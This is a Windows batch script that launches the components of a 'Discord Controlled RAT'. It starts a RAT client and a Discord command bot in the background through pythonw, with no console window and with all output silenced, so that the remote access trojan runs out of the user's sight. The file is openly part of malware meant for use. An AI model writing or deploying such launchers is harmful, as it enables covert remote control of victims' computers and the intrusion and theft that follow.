@echo off
rem Start the Discord Controlled RAT components
rem Ensure virtual environment or dependencies are installed

rem Start RAT client in background without a console window
start "" /b pythonw rat_client.py >nul 2>&1

rem Start Discord bot in background after a short delay
ping -n 3 127.0.0.1 > nul
start "" /b pythonw discord_bot.py >nul 2>&1

echo All services started.
exit